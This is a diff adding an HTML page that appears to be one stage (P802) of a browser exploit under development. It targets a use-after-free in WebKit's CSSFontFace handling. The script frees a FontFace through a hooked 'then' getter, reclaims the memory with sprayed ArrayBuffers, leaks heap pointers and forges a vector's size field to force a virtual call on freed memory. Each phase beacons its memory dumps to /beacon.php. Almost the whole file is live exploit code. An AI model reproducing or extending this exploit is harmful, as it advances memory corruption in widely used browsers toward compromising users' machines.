@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P802 — Vector size inject (m_size in high dword)</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P802 — Vector size inject (m_size in high dword)
+ *
+ * P801-C confirmed: q12 = 0x0000000000000001 => m_capacity=1,
+ * m_size=0 => NO iteration (size=0). Layout survived, no new writes.
+ *
+ * WTF::Vector layout at CSSFontFace+0x58:
+ *   +0x58: m_buffer  (8B) = q11 -> self+0x68
+ *   +0x60: m_capacity (4B) = LOW  dword of q12
+ *   +0x64: m_size     (4B) = HIGH dword of q12
+ *   +0x68: inline storage  = q13 = source[0] pointer
+ *
+ * To set m_size=1:
+ *   q12 = 0x00000001_00000001 => cap=1, size=1
+ *   q12 = 0x00000001_00000000 => cap=0, size=1
+ *
+ * PHASES:
+ *   A: q12 = 0x0000000100000001 (cap=1,size=1) + layout
+ *   B: q12 = 0x0000000100000000 (cap=0,size=1) + layout
+ *   C: q12 = 0x0000000000000001 (cap=1,size=0, CONTROL) + layout
+ *   D: q12 = 0x0000000100000001 + fonts.check
+ *   E: q12 = 0x0000000100000001 + face1.load()
+ *   F: face1.family = "test2" (descriptor write)
+ *
+ * CRASH_CLASS: HIGH — forced vtable dispatch on freed source
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P802-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P802-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+var PHASES = ['A','B','C','D','E','F'];
+
+function getPhase(){
+  try { return localStorage.getItem('p802_phase') || 'A'; } catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p802_phase', p); } catch(e){}
+}
+
+function dumpAB(label, view){
+  var nz = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) nz.push('q' + q + '=0x' + h16(view[q]));
+  }
+  b(label, nz.join('|').slice(0, 700));
+  log(label + ': ' + (nz.length > 0 ? nz.join(' ') : '(all zero)'));
+  return nz;
+}
+
+function rawDump(label, view){
+  var raw = '';
+  for (var q = 0; q < 12; q++) raw += h16(view[q]);
+  b(label + '-R1', raw);
+  raw = '';
+  for (var q = 12; q < 24; q++) raw += h16(view[q]);
+  b(label + '-R2', raw);
+}
+
+var face1_ref = null;
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  var idx = PHASES.indexOf(phase);
+  if (idx < 0 || idx >= PHASES.length){
+    b('DONE', 'all_phases_complete');
+    log('All phases complete!');
+    try { localStorage.removeItem('p802_phase'); } catch(e){}
+    return;
+  }
+
+  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
+  setPhase(nextPhase);
+
+  b('BOOT', 'phase=' + phase);
+  log('P802 — Vector Size Inject — Phase ' + phase + '\n');
+
+  /* ===== UAF setup ===== */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:ws1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('wf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  face1_ref = face1;
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em ws1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em wf1, ws1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(phase + '-P1-MISS', 'no_reclaim');
+      log('P1 MISS, retrying...');
+      setPhase(phase);
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    var self1 = q11_1 - 0x68n;
+
+    b(phase + '-P1', 'self=0x' + h16(self1) + '|q13=0x' + h16(q13_1));
+    log('P1 hit: self=0x' + h16(self1) + ' q13=0x' + h16(q13_1));
+
+    dumpAB(phase + '-BASE', view1);
+    rawDump(phase + '-BASE', view1);
+
+    /* ===== PHASE-SPECIFIC ACTIONS ===== */
+
+    if (phase === 'A') {
+      /* Phase A: cap=1, size=1, force layout */
+      log('\nPhase A: q12 = 0x0000000100000001 (cap=1, size=1)');
+      view1[12] = 0x0000000100000001n;
+      b(phase + '-INJECT', 'q12=0x0000000100000001');
+
+      var span = document.createElement('span');
+      span.style.fontFamily = 'wf1, serif';
+      span.style.fontSize = '48px';
+      span.textContent = 'A';
+      document.body.appendChild(span);
+      try { document.body.offsetHeight; } catch(e){}
+      b(phase + '-LAYOUT', 'forced');
+
+      setTimeout(function(){
+        dumpAB(phase + '-POST', view1);
+        rawDump(phase + '-POST', view1);
+
+        setTimeout(function(){
+          dumpAB(phase + '-T2000', view1);
+          rawDump(phase + '-T2000', view1);
+          log('\nPhase A complete.');
+          setTimeout(function(){ location.reload(); }, 800);
+        }, 1500);
+      }, 500);
+
+    } else if (phase === 'B') {
+      /* Phase B: cap=0, size=1, force layout */
+      log('\nPhase B: q12 = 0x0000000100000000 (cap=0, size=1)');
+      view1[12] = 0x0000000100000000n;
+      b(phase + '-INJECT', 'q12=0x0000000100000000');
+
+      var span = document.createElement('span');
+      span.style.fontFamily = 'wf1, serif';
+      span.style.fontSize = '48px';
+      span.textContent = 'A';
+      document.body.appendChild(span);
+      try { document.body.offsetHeight; } catch(e){}
+      b(phase + '-LAYOUT', 'forced');
+
+      setTimeout(function(){
+        dumpAB(phase + '-POST', view1);
+        rawDump(phase + '-POST', view1);
+
+        setTimeout(function(){
+          dumpAB(phase + '-T2000', view1);
+          rawDump(phase + '-T2000', view1);
+          log('\nPhase B complete.');
+          setTimeout(function(){ location.reload(); }, 800);
+        }, 1500);
+      }, 500);
+
+    } else if (phase === 'C') {
+      /* Phase C: CONTROL — cap=1, size=0, force layout (same as P801-C) */
+      log('\nPhase C: q12 = 0x0000000000000001 (cap=1, size=0, CONTROL)');
+      view1[12] = 0x0000000000000001n;
+      b(phase + '-INJECT', 'q12=0x0000000000000001');
+
+      var span = document.createElement('span');
+      span.style.fontFamily = 'wf1, serif';
+      span.style.fontSize = '48px';
+      span.textContent = 'A';
+      document.body.appendChild(span);
+      try { document.body.offsetHeight; } catch(e){}
+      b(phase + '-LAYOUT', 'forced');
+
+      setTimeout(function(){
+        dumpAB(phase + '-POST', view1);
+        rawDump(phase + '-POST', view1);
+        log('\nPhase C complete (control).');
+        setTimeout(function(){ location.reload(); }, 800);
+      }, 500);
+
+    } else if (phase === 'D') {
+      /* Phase D: cap=1, size=1 + fonts.check instead of layout */
+      log('\nPhase D: q12 = 0x0000000100000001 + fonts.check');
+      view1[12] = 0x0000000100000001n;
+      b(phase + '-INJECT', 'q12=0x0000000100000001');
+
+      try { document.fonts.add(face1_ref); } catch(e){
+        b(phase + '-ADD-ERR', e.message);
+      }
+      b(phase + '-READD', 'face1_readded');
+
+      var checkResult = 'unknown';
+      try { checkResult = String(document.fonts.check('1em wf1', 'A')); } catch(e){
+        checkResult = 'ERR:' + e.message;
+      }
+      b(phase + '-CHECK', checkResult);
+
+      setTimeout(function(){
+        dumpAB(phase + '-POST', view1);
+        rawDump(phase + '-POST', view1);
+        log('\nPhase D complete.');
+        setTimeout(function(){ location.reload(); }, 800);
+      }, 500);
+
+    } else if (phase === 'E') {
+      /* Phase E: cap=1, size=1 + face1.load() to trigger re-resolution */
+      log('\nPhase E: q12 = 0x0000000100000001 + face1.load()');
+      view1[12] = 0x0000000100000001n;
+      b(phase + '-INJECT', 'q12=0x0000000100000001');
+
+      try {
+        face1_ref.load().then(function(f){
+          b(phase + '-LOAD-OK', 'resolved');
+          dumpAB(phase + '-POST-LOAD', view1);
+          rawDump(phase + '-POST-LOAD', view1);
+        }, function(e){
+          b(phase + '-LOAD-ERR', e && e.message);
+          dumpAB(phase + '-POST-LOAD', view1);
+          rawDump(phase + '-POST-LOAD', view1);
+        });
+      } catch(e){
+        b(phase + '-LOAD-CATCH', e.message);
+      }
+
+      setTimeout(function(){
+        dumpAB(phase + '-T3000', view1);
+        rawDump(phase + '-T3000', view1);
+        log('\nPhase E complete.');
+        setTimeout(function(){ location.reload(); }, 800);
+      }, 2500);
+
+    } else if (phase === 'F') {
+      /* Phase F: face1.family = "test2" — descriptor write through dangling ptr */
+      log('\nPhase F: face1.family = "test2" (descriptor write)');
+
+      dumpAB(phase + '-PRE-WRITE', view1);
+
+      try {
+        face1_ref.family = 'test2';
+        b(phase + '-WRITE-OK', 'family_set');
+      } catch(e){
+        b(phase + '-WRITE-ERR', e.message);
+      }
+
+      setTimeout(function(){
+        dumpAB(phase + '-POST-WRITE', view1);
+        rawDump(phase + '-POST-WRITE', view1);
+
+        /* Also try unicodeRange write */
+        try {
+          face1_ref.unicodeRange = 'U+0041-007A';
+          b(phase + '-URANGE-OK', 'set');
+        } catch(e){
+          b(phase + '-URANGE-ERR', e.message);
+        }
+
+        setTimeout(function(){
+          dumpAB(phase + '-POST-URANGE', view1);
+          rawDump(phase + '-POST-URANGE', view1);
+          log('\nPhase F complete.');
+          setTimeout(function(){ location.reload(); }, 800);
+        }, 500);
+      }, 500);
+    }
+
+  }, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P802 — Vector Size Inject — Loading...</pre>
+</body>
+</html>
